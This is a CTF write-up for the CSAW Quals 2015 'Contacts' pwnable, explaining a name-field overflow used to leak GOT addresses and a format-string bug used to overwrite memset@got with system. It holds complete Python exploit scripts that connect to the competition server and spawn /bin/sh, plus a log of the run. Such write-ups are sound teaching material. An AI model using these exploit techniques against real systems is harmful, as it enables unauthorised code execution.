---
layout: post
title: "CSAW Quals 2015 Contacts"
date: 2015-09-23 19:17:29 -0400
author: [barrebas]
comments: true
categories: [csaw]
---

### Solved by barrebas 

This CTF marked our team's anniversary! We managed to pop this pwnable. 

We're given a 32-bit ELF binary, which uses malloc() and free(). Must be some kind of heap vulnerability then, right?

The binary is some kind of contact storage. We can enter names, phone numbers and descriptions. The name gets stored in the .bss segment, while the phone number and description are stored on the heap. We can overflow the name field like so:

```
Menu:
1)Create contact
2)Remove contact
3)Edit contact
4)Display contacts
5)Exit
>>> 1
Contact info: 
    Name: BARREBAS
[DEBUG] Haven't written a parser for phone numbers; You have 10 numbers
    Enter Phone No: 0  
    Length of description: 100       
    Enter description:
        BLEH
Menu:
1)Create contact
2)Remove contact
3)Edit contact
4)Display contacts
5)Exit
>>> 4
Contacts:
    Name: BARREBAS
    Length 100
    Phone #: 0
    Description: BLEH
Menu:
1)Create contact
2)Remove contact
3)Edit contact
4)Display contacts
5)Exit
>>> 3
Name to change? BARREBAS
1.Change name
2.Change description
>>> 1
New name: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
Menu:
1)Create contact
2)Remove contact
3)Edit contact
4)Display contacts
5)Exit
>>> 4
Contacts:
    Name: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
    Length 1111638594
    Phone #: 0
    Description: BLEH
```

So suppose the struct looked something like

```c
struct {
    char *phoneNumber;  // malloc'ed
    char *description;  // malloc'ed
    char name[64];
    int descriptionLength;
    int valid;
} info_t;
```

We can use this to leak information by overwriting the **next** struct's *phoneNumber* and *description*. We cannot use this to write anything, as the program will automatically call free() on the description. If it doesn't contain a valid heap address, the binary will crash. First, we'll abuse the leak to determine the remote libc version.

```python
from socket import *
import struct, telnetlib, re, sys, time

def readtil(delim):
    buf = b''
    while not delim in buf:
      buf += s.recv(1)
    return buf

def sendln(b):
    s.send(b + b'\n')

def sendbin(b):
    s.sendall(b)

def p(x):
    return struct.pack('<L', x & 0xffffffff)

def leak(x):
    print "leaking " + hex(x)
    global last_addr
    # edit contact 1 -> name to overflow pointers
    sendln('3')
    readtil('change? ')
    if last_addr == 0:
        sendln('BAR1')
    else:
        sendln('B'*63)
    
    readtil('>>> ')
    sendln('1')
    readtil('name:')
    #       name          length valid  char *description // char *phone==leak->malloc@got  
    sendln('B'*63+"\x00"+"BBBB"+p(0)+p(x)+p(x)+"BAR2")
    last_addr = x
    
    readtil('>>> ')
    
    sendln('4')
    data = readtil('>>> ')
    m = re.findall('Phone #: (.*)', data)
    return m[0]
    
def leak4(x):
    return struct.unpack('I', leak(x)[0:4])[0]
    
def pwn():
    global s
    global last_addr
    last_addr = 0
    s=socket(AF_INET, SOCK_STREAM)
    #s.connect(('127.0.0.1', 4444))
    s.connect(('54.165.223.128', 2555))
    readtil('>>> ')
    
    # create contact 1
    sendln('1')
    readtil('Name: ')
    sendln('BAR1')
    readtil('Phone No: ')
    sendln('0')
    readtil('description: ')
    sendln('100')
    readtil('description:')
    sendln('BLEH')
    
    readtil('>>> ')
    
    # create contact 2
    sendln('1')
    readtil('Name: ')
    sendln('BAR2')
    readtil('Phone No: ')
    sendln('1')
    readtil('description: ')
    sendln('100')
    readtil('description:')
    sendln('BLAH')
    
    readtil('>>> ')

    malloc = leak4(0x804b020)
    print "[+] malloc @ " + hex(malloc)
    puts = leak4(0x804b024)
    print "[+] puts   @ " + hex(puts)
```

This gave us two addresses, and [libcdb.com](http://libcdb.com/) gave us no less than five options. We logged back into the server for pwn100, which had a different IP address so was probably a differnent box. We figured that the CTF organizers used the same base image for each box. The symbols of the libc on pwn100's box seemed to match what we found via the leak and we just got the address of system from that machine.

Now, we needed a way to write to the got. Turns out there was another format string vulnerability in the description field:

```
Menu:
1)Create contact
2)Remove contact
3)Edit contact
4)Display contacts
5)Exit
>>> 1
Contact info: 
    Name: BAR1
[DEBUG] Haven't written a parser for phone numbers; You have 10 numbers
    Enter Phone No: 0
    Length of description: 100
    Enter description:
        %X-%X-%X-%X-%X-%X
Menu:
1)Create contact
2)Remove contact
3)Edit contact
4)Display contacts
5)Exit
>>> 4
Contacts:
    Name: BAR1
    Length 100
    Phone #: 0
    Description: 9B24008-F77724E0-F7771FF4-0-0-FFDE40D8
Menu:
1)Create contact
2)Remove contact
3)Edit contact
4)Display contacts
5)Exit
>>>
```

We used the same trick as in [ekoparty's echoes binary](https://ctf-team.vulnhub.com/eko-party-pre-ctf-2015-echoes/), selecting a stack address (actually a saved stack frame pointer) which points to another stack address, which we can then use to write out an address on the stack. Finally, use that third format string argument to write anything anywhere. 

We then use the leak to determine libc's base address, add the offset for system, and finally overwrite memset@got with system. Then, once we delete an element with name `/bin/sh`, we in fact call `system('/bin/sh')` and we win.

Without further ado:

```python
from socket import *
import struct, telnetlib, re, sys, time

def readtil(delim):
    buf = b''
    while not delim in buf:
      buf += s.recv(1)
    return buf

def sendln(b):
    s.send(b + b'\n')

def sendbin(b):
    s.sendall(b)

def p(x):
    return struct.pack('<L', x & 0xffffffff)


def write(x, i):
    # first, leak address to which we'll write ($30) so that we can align the writes to $30
    sendln('3')
    readtil('change? ')
    sendln('BAR4')
    readtil('>>> ')
    sendln('2')
    readtil('iption:')
    sendln('1000')
    readtil('iption:')
    sendln('ZZZZ%18$.08xBBBB')
    readtil('>>> ')
    sendln('4')
    data = readtil('>>> ')
    m = re.findall('ZZZZ(.*)BBBB', data)
    
    addr = m[0].decode('hex')
    addr = struct.unpack('>I', addr)[0]
    start = addr & 0xff

# setup $30 to x (addr to write) via $18 by first setting $6->$18
#-----------
    sendln('3')
    readtil('change? ')
    sendln('BAR4')
    readtil('>>> ')
    sendln('2')
    readtil('iption:')
    sendln('1000')
    readtil('iption:')
    sendln('%'+str(start+1) + 'c%6$hhn')
    readtil('>>> ')
    sendln('4')
    readtil('>>> ') 
    
    sendln('3')
    readtil('change? ')
    sendln('BAR4')
    readtil('>>> ')
    sendln('2')
    readtil('iption:')
    sendln('1000')
    readtil('iption:')
    sendln('%'+str((x >> 8) & 0xff)+'c%18$hhn')
    readtil('>>> ')
    sendln('4')
    readtil('>>> ')
#-----------
#-----------
    sendln('3')
    readtil('change? ')
    sendln('BAR4')
    readtil('>>> ')
    sendln('2')
    readtil('iption:')
    sendln('1000')
    readtil('iption:')
    sendln('%'+str(start+2) + 'c%6$hhn')
    readtil('>>> ')
    sendln('4')
    readtil('>>> ')
    
    sendln('3')
    readtil('change? ')
    sendln('BAR4')
    readtil('>>> ')
    sendln('2')
    readtil('iption:')
    sendln('1000')
    readtil('iption:')
    sendln('%'+str((x >> 16) & 0xff)+'c%18$hhn')
#   readtil('>>> ')
    sendln('4')
    readtil('>>> ')
#-----------
#-----------
    sendln('3')
    readtil('change? ')
    sendln('BAR4')
    readtil('>>> ')
    sendln('2')
    readtil('iption:')
    sendln('1000')
    readtil('iption:')
    sendln('%'+str(start+3) + 'c%6$hhn')
    readtil('>>> ')
    sendln('4')
    readtil('>>> ')
    
    sendln('3')
    readtil('change? ')
    sendln('BAR4')
    readtil('>>> ')
    sendln('2')
    readtil('iption:')
    sendln('1000')
    readtil('iption:')
    sendln('%'+str((x >> 24) & 0xff)+'c%18$hhn')
    readtil('>>> ')
    sendln('4')
    readtil('>>> ')
#-----------

    sendln('3')
    readtil('change? ')
    sendln('BAR4')
    readtil('>>> ')
    sendln('2')
    readtil('iption:')
    sendln('1000')
    readtil('iption:')
    sendln('%'+str(start) + 'c%6$hhn')
    #readtil('>>> ')
    sendln('4')
    readtil('>>> ')
    
    sendln('3')
    readtil('change? ')
    sendln('BAR4')
    readtil('>>> ')
    sendln('2')
    readtil('iption:')
    sendln('1000')
    readtil('iption:')
    sendln('%'+str(x & 0xff)+'c%18$hhn')
    #readtil('>>> ')
    sendln('4')
    readtil('>>> ')

# start writing bytes       
#---write first byte
    sendln('3')
    readtil('change? ')
    sendln('BAR4')
    readtil('>>> ')
    sendln('2')
    readtil('iption:')
    sendln('1000')
    readtil('iption:')
    sendln('%'+str(i & 0xff) + 'c%30$hhn')
    #readtil('>>> ')
    sendln('4')
    readtil('>>> ')


    sendln('3')
    readtil('change?')
    sendln('BAR4')
    readtil('>>>')
    sendln('2')
    readtil('iption:')
    sendln('1000')
    readtil('iption:')
    sendln('%'+str((x+1) & 0xff)+'c%18$hhn')
    #readtil('>>> ')
    sendln('4')
    readtil('>>> ')

    sendln('3')
    readtil('change? ')
    sendln('BAR4')
    readtil('>>> ')
    sendln('2')
    readtil('iption:')
    sendln('1000')
    readtil('iption:')
    sendln('%'+str((i >> 8) & 0xff) + 'c%30$hhn')
    readtil('>>> ')
    sendln('4')
    readtil('>>> ')

    sendln('3')
    readtil('change? ')
    sendln('BAR4')
    readtil('>>> ')
    sendln('2')
    readtil('iption:')
    sendln('1000')
    readtil('iption:')
    sendln('%'+str((x+2) & 0xff)+'c%18$hhn')
    #readtil('>>> ')
    sendln('4')
    readtil('>>> ')

    sendln('3')
    readtil('change? ')
    sendln('BAR4')
    readtil('>>> ')
    sendln('2')
    readtil('iption:')
    sendln('1000')
    readtil('iption:')
    sendln('%'+str((i >> 16) & 0xff) + 'c%30$hhn')
    readtil('>>> ')
    sendln('4')
    readtil('>>> ')

    sendln('3')
    readtil('change? ')
    sendln('BAR4')
    readtil('>>> ')
    sendln('2')
    readtil('iption:')
    sendln('1000')
    readtil('iption:')
    sendln('%'+str((x+3) & 0xff)+'c%18$hhn')
    #readtil('>>> ')
    sendln('4')
    readtil('>>> ')

    sendln('3')
    readtil('change? ')
    sendln('BAR4')
    readtil('>>> ')
    sendln('2')
    readtil('iption:')
    sendln('1000')
    readtil('iption:')
    sendln('%'+str((i >> 24) & 0xff) + 'c%30$hhn')
    readtil('>>> ')
    sendln('4')
    readtil('>>> ')
                    
    
def leak(x):
    print "leaking " + hex(x)
    global last_addr
    # edit contact 1 -> name to overflow pointers
    sendln('3')
    readtil('change? ')
    if last_addr == 0:
        sendln('BAR1')
    else:
        sendln('B'*63)
    
    readtil('>>> ')
    sendln('1')
    readtil('name:')
    #       name   len    valid   char *description==write1->free@got // char *phone==leak1->malloc@got  
    sendln('B'*63+"\x00"+"BBBB"+p(0)+p(x)+p(x)+"BAR2")
    last_addr = x
    
    readtil('>>> ')
    
    sendln('4')
    data = readtil('>>> ')
    m = re.findall('Phone #: (.*)', data)
    return m[0]
    
def leak4(x):
    return struct.unpack('I', leak(x)[0:4])[0]
    
def pwn():
    global s
    global last_addr
    last_addr = 0
    s=socket(AF_INET, SOCK_STREAM)
    #s.connect(('127.0.0.1', 4444))
    s.connect(('54.165.223.128', 2555))
    readtil('>>> ')
    
    # create contact 1
    sendln('1')
    readtil('Name: ')
    sendln('BAR1')
    readtil('Phone No: ')
    sendln('0')
    readtil('description: ')
    sendln('100')
    readtil('description:')
    sendln('BLEH')
    
    readtil('>>> ')
    
    # create contact 2
    sendln('1')
    readtil('Name: ')
    sendln('BAR2')
    readtil('Phone No: ')
    sendln('1')
    readtil('description: ')
    sendln('100')
    readtil('description:')
    sendln('BLAH')
    
    readtil('>>> ')
    
    # create contact 3 (used in write)
    sendln('1')
    readtil('Name: ')
    sendln('BAR4')
    readtil('Phone No: ')
    sendln('1')
    readtil('description: ')
    sendln('100')
    readtil('description:')
    sendln('BLAH')
    
    readtil('>>> ')

    # create contact 4 (used as payload for system())
    sendln('1')
    readtil('Name: ')
    sendln('/bin/sh')
    readtil('Phone No: ')
    sendln('1')
    readtil('description: ')
    sendln('100')
    readtil('description:')
    sendln('BLAH')
        
    readtil('>>> ')
    
    # 00064c10 W puts
    # 00075b30 malloc
    # 0004cc40 T print
    
    
    malloc = leak4(0x804b020)
    print "[+] malloc @ " + hex(malloc)
    
    libc = malloc - 0x0075b30
    print "[+] libc @ " + hex(libc)
    
    # 0003fcd0 W system
    system = libc + 0x003fcd0
    
    print "[+] system @ " + hex(system)
    
    print "[+] overwriting memset@got with system the hard way"
    write(0x804b03c, system)
    
    print "[+] deleting element"
    
    sendln('2')
    readtil('remove?')
    sendln('/bin/sh')

    t=telnetlib.Telnet()
    t.sock =s 
    t.interact()
    

    s.close()
pwn()
```

And in action:

```
bas@tritonal:~/bin/csaw15/pwn250$ python ./pwn250poc.py 
leaking 0x804b020
[+] malloc @ 0xf7619b30
[+] libc @ 0xf75a4000
[+] system @ 0xf75e3cd0
waiting...
[+] overwriting memset@got with system the hard way
writing 0x804b03c
['ffade868']
0x68
 
    Menu:
1)Create contact
2)Remove contact
3)Edit contact
4)Display contacts
5)Exit
>>> 
[+] deleting element
Name to remove? /bin/sh
id
uid=1001(ctf) gid=1001(ctf) groups=1001(ctf)
cd 
ls
contacts_54f3188f64e548565bc1b87d7aa07427
flag
cat flag
flag{f0rm47_s7r1ng5_4r3_fun_57uff}
```

Gotta love format string vulnerabilities. The flag was `flag{f0rm47_s7r1ng5_4r3_fun_57uff}`. 
